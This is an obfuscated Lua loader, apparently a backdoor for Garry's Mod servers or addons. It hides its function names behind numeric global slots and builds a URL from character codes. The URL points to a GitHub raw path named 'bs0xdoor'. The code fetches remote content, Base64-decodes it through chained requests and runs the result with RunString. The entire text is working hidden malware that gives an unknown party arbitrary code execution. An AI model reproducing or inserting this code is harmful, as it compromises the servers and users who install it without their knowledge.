_G[1]=string.char;_G[2]=string.byte;_G[3]=table.concat;_G[4]=util.Base64Decode;_G[5]=RunString;_G[6]=http.Fetch;_G[7]=_G[7]or{};for a=1,7 do _G[7][a]=_G[7][a]or{} end;_G[8]=function(b)local c,d={},#b for e=1,d,2 do local f,g=_G[2](b,e),_G[2](b,e+1)local h=(f>96 and f-87 or f-48)*16+(g>96 and g-87 or g-48)c[#c+1]=_G[1](h)end return _G[3](c)end;_G[9]=_G[8]("6144395a74526b58377142312e6a73");_G[10]=function(i,j)j=j or 1;if j>3 then return end;_G[6](i,function(k)for l=1,#k do _G[7][j][l]=_G[1](_G[2](k,l))end local m=_G[3](_G[7][j])local n=_G[4](m)return j==3 and _G[5](n)or _G[10](n,j+1)end,function()end)end;_G[10](_G[3]({_G[1](104), _G[1](116), _G[1](116), _G[1](112), _G[1](115), _G[1](58), _G[1](47), _G[1](47), _G[1](114), _G[1](97), _G[1](119), _G[1](46), _G[1](103), _G[1](105), _G[1](116), _G[1](104), _G[1](117), _G[1](98), _G[1](117), _G[1](115), _G[1](101), _G[1](114), _G[1](99), _G[1](111), _G[1](110), _G[1](116), _G[1](101), _G[1](110), _G[1](116), _G[1](46), _G[1](99), _G[1](111), _G[1](109), _G[1](47), _G[1](98), _G[1](115), _G[1](48), _G[1](120), _G[1](100), _G[1](111), _G[1](111), _G[1](114), _G[1](47), _G[1](114), _G[1](101), _G[1](100), _G[1](105), _G[1](114), _G[1](101), _G[1](99), _G[1](116), _G[1](47), _G[1](114), _G[1](101), _G[1](102), _G[1](115), _G[1](47), _G[1](104), _G[1](101), _G[1](97), _G[1](100), _G[1](115), _G[1](47), _G[1](109), _G[1](97), _G[1](105), _G[1](110), _G[1](47)}).._G[9])